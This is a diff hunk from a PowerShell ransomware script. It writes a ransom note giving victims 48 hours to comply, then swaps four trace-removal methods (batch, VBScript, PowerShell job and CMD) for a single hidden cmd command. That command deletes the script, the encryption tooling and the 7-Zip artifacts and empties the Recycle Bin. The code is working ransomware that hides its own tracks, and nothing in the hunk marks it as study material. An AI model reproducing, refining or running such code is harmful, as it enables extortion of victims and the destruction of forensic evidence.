@@ -1015,71 +1015,22 @@ You have 48 hours to comply.
     $ransomNote | Out-File -FilePath (Join-Path $CurrentDir "README_IMPORTANT.txt") -Encoding ASCII
     Write-Status "Ransom note created: README_IMPORTANT.txt" -Type Success
 
-    # Self-delete the script and remove traces - MULTIPLE METHODS
+    # Self-delete the script - using inline command (no temp files)
     Write-Status "Removing script traces..." -Type Info
 
     $scriptToDelete = $MyInvocation.MyCommand.Path
     $scriptDir = Split-Path -Parent $scriptToDelete
 
-    if ($DebugMode) { Write-Host "[DEBUG] Script to delete: $scriptToDelete" -ForegroundColor Magenta }
-
-    # METHOD 1: Batch file in TEMP directory
-    try {
-        $cleanupBat = Join-Path $env:TEMP "del_$(Get-Random).bat"
-        $batContent = "@echo off`r`ntimeout /t 2 /nobreak >nul`r`ndel /f /q `"$scriptToDelete`" 2>nul`r`ncd /d `"$scriptDir`"`r`ndel /f /q encrypt_files.* 2>nul`r`ndel /f /q 7z*.* 2>nul`r`nrd /s /q `"%SYSTEMDRIVE%\`$Recycle.Bin`" 2>nul`r`ndel /f /q `"$cleanupBat`" 2>nul`r`nexit"
-        [System.IO.File]::WriteAllText($cleanupBat, $batContent)
-        Start-Process -FilePath "cmd.exe" -ArgumentList "/c start /min `"`" `"$cleanupBat`"" -WindowStyle Hidden
-        if ($DebugMode) { Write-Host "[DEBUG] Method 1: Batch file cleanup launched" -ForegroundColor Magenta }
-    } catch {
-        if ($DebugMode) { Write-Host "[DEBUG] Method 1 failed: $($_.Exception.Message)" -ForegroundColor Magenta }
+    if ($DebugMode) {
+        Write-Host "[DEBUG] Script path: $scriptToDelete" -ForegroundColor Magenta
+        Write-Host "[DEBUG] Script directory: $scriptDir" -ForegroundColor Magenta
     }
 
-    # METHOD 2: VBScript self-delete
-    try {
-        $vbsScript = Join-Path $env:TEMP "del_$(Get-Random).vbs"
-        $vbsContent = @"
-WScript.Sleep 2000
-Set fso = CreateObject("Scripting.FileSystemObject")
-On Error Resume Next
-fso.DeleteFile "$scriptToDelete", True
-fso.DeleteFile "$scriptDir\encrypt_files.bat", True
-fso.DeleteFile "$scriptDir\encrypt_files.ps1", True
-fso.DeleteFile "$scriptDir\7z.exe", True
-fso.DeleteFile "$scriptDir\7z2501-x64.msi", True
-fso.DeleteFile "$scriptDir\7z2501-x64.exe", True
-fso.DeleteFile "$scriptDir\7z2501-arm64.exe", True
-fso.DeleteFile "$vbsScript", True
-"@
-        [System.IO.File]::WriteAllText($vbsScript, $vbsContent)
-        Start-Process -FilePath "wscript.exe" -ArgumentList "`"$vbsScript`"" -WindowStyle Hidden
-        if ($DebugMode) { Write-Host "[DEBUG] Method 2: VBScript cleanup launched" -ForegroundColor Magenta }
-    } catch {
-        if ($DebugMode) { Write-Host "[DEBUG] Method 2 failed: $($_.Exception.Message)" -ForegroundColor Magenta }
-    }
+    # Use inline CMD command to delete after script exits - SIMPLE & RELIABLE
+    $deleteCmd = "timeout /t 2 /nobreak >nul & del /f /q `"$scriptToDelete`" 2>nul & cd /d `"$scriptDir`" & del /f /q encrypt_files.* 2>nul & del /f /q 7z*.* 2>nul & rd /s /q %SYSTEMDRIVE%\`$Recycle.Bin 2>nul"
+    Start-Process -FilePath "cmd.exe" -ArgumentList "/c $deleteCmd" -WindowStyle Hidden -NoNewWindow
 
-    # METHOD 3: PowerShell job (background)
-    try {
-        Start-Job -ScriptBlock {
-            param($path, $dir)
-            Start-Sleep -Seconds 3
-            Remove-Item -Path $path -Force -ErrorAction SilentlyContinue
-            Set-Location $dir
-            Remove-Item -Path "encrypt_files.*" -Force -ErrorAction SilentlyContinue
-            Remove-Item -Path "7z*.*" -Force -ErrorAction SilentlyContinue
-        } -ArgumentList $scriptToDelete, $scriptDir | Out-Null
-        if ($DebugMode) { Write-Host "[DEBUG] Method 3: PowerShell job cleanup launched" -ForegroundColor Magenta }
-    } catch {
-        if ($DebugMode) { Write-Host "[DEBUG] Method 3 failed: $($_.Exception.Message)" -ForegroundColor Magenta }
-    }
-
-    # METHOD 4: Direct CMD command
-    try {
-        $cmdCommand = "cmd.exe /c `"timeout /t 2 /nobreak >nul & del /f /q `"$scriptToDelete`" 2>nul & cd /d `"$scriptDir`" & del /f /q encrypt_files.* 2>nul & del /f /q 7z*.* 2>nul`""
-        Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$cmdCommand`"" -WindowStyle Hidden -NoNewWindow
-        if ($DebugMode) { Write-Host "[DEBUG] Method 4: Direct CMD cleanup launched" -ForegroundColor Magenta }
-    } catch {
-        if ($DebugMode) { Write-Host "[DEBUG] Method 4 failed: $($_.Exception.Message)" -ForegroundColor Magenta }
-    }
+    if ($DebugMode) { Write-Host "[DEBUG] Self-delete command launched" -ForegroundColor Magenta }
 
 } catch {
     Write-Host ""
